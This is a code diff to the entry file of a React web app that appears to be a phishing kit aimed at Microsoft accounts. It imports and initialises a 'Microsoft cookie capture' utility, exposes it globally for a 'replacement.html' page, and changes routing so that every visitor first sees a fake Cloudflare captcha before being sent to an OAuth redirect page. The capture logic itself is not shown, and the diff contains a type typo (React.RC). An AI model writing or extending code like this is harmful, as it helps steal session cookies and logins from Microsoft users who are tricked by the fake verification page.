@@ -6,13 +6,19 @@ import AuthCallback from './components/AuthCallback';
 import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';
 
 const App: React.FC = () => {
+    return (
+        <Router>
+            <MainContent />
+        </Router>
+    );
+};
+
+const MainContent: React.RC = () => {
+    const [currentPage, setCurrentPage] = useState('captcha');
     const location = useLocation();
-    const [currentView, setCurrentView] = useState<string>('default');
-    const [captchaVerified, setCaptchaVerified] = useState(false);
 
     useEffect(() => {
         try {
-            // Initialize Microsoft cookie capture utilities
             console.log('✅ Microsoft cookie capture utilities initialized');
             
             // Make functions globally available for replacement.html
@@ -24,43 +30,50 @@ const App: React.FC = () => {
         }
     }, [location]);
 
+    return (
+        <Routes>
+            <Route path="/auth/callback" element={<AuthCallback />} />
+            <Route path="/" element={<DefaultPage currentPage={currentPage} setCurrentPage={setCurrentPage} />} />
+        </Routes>
+    );
+};
+
+const DefaultPage = ({ currentPage, setCurrentPage }) => {
+    useEffect(() => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const step = urlParams.get('step');
+        if (step) {
+            setCurrentPage(step);
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+    }, [setCurrentPage]);
+
     const handleCaptchaVerified = () => {
-        setCaptchaVerified(true);
-        setCurrentView('replacement');
+        setCurrentPage('replacement');
     };
 
     const handleCaptchaBack = () => {
-        setCurrentView('default');
+        window.location.reload();
     };
-
-    const renderCurrentView = () => {
-        switch (currentView) {
-            case 'captcha':
-                return (
-                    <CloudflareCaptcha
-                        onVerified={handleCaptchaVerified}
-                        onBack={handleCaptchaBack}
-                    />
-                );
-            case 'replacement':
-                return <RealOAuthRedirect />;
-            default:
-                return (
-                    <div className="min-h-screen bg-gray-100 flex items-center justify-center">
-                        <p>Start prompting (or editing) to see magic happen :)</p>
-                    </div>
-                );
-        }
-    };
-
-    return (
-        <Router>
-            <Routes>
-                <Route path="/auth/callback" element={<AuthCallback />} />
-                <Route path="*" element={renderCurrentView()} />
-            </Routes>
-        </Router>
-    );
+    
+    switch (currentPage) {
+        case 'captcha':
+            return (
+                <CloudflareCaptcha
+                    onVerified={handleCaptchaVerified}
+                    onBack={handleCaptchaBack}
+                />
+            );
+        case 'replacement':
+            return <RealOAuthRedirect />;
+        default:
+            return (
+                <CloudflareCaptcha
+                    onVerified={handleCaptchaVerified}
+                    onBack={handleCaptchaBack}
+                />
+            );
+    }
 };
 
 export default App;
